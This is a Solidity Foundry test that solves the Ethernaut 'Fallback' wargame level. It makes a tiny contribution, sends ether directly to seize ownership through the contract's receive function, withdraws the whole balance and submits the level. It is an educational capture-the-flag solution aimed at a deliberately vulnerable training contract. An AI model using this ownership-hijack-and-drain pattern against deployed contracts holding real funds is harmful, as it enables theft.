// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "../Fallback/FallbackFactory.sol";
import "../Ethernaut.sol";
import "./utils/vm.sol";

contract FallbackTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    address eoaAddress = address(100);

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
        // Deal EOA address some ether
        vm.deal(eoaAddress, 5 ether);
    }

    function testFallbackAttack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        FallbackFactory fallbackFactory = new FallbackFactory();
        ethernaut.registerLevel(fallbackFactory);
        vm.startPrank(eoaAddress);
        address levelAddress = ethernaut.createLevelInstance(fallbackFactory);
        Fallback fallbackInstance = Fallback(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        // Pay a small contribution
        fallbackInstance.contribute{value : 1 wei}();
        assertEq(fallbackInstance.getContribution(), 1 wei, "Contribution failed.");

        // Make me the owner
        (bool result,) = payable(address(fallbackInstance)).call{value : 1}("");
        require(result);
        assertEq(fallbackInstance.owner(), eoaAddress, "Setting owner failed.");

        emit log_named_uint("Fallback contract balance before attack", address(fallbackInstance).balance);
        fallbackInstance.withdraw();
        emit log_named_uint("Fallback contract balance after attack", address(fallbackInstance).balance);

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
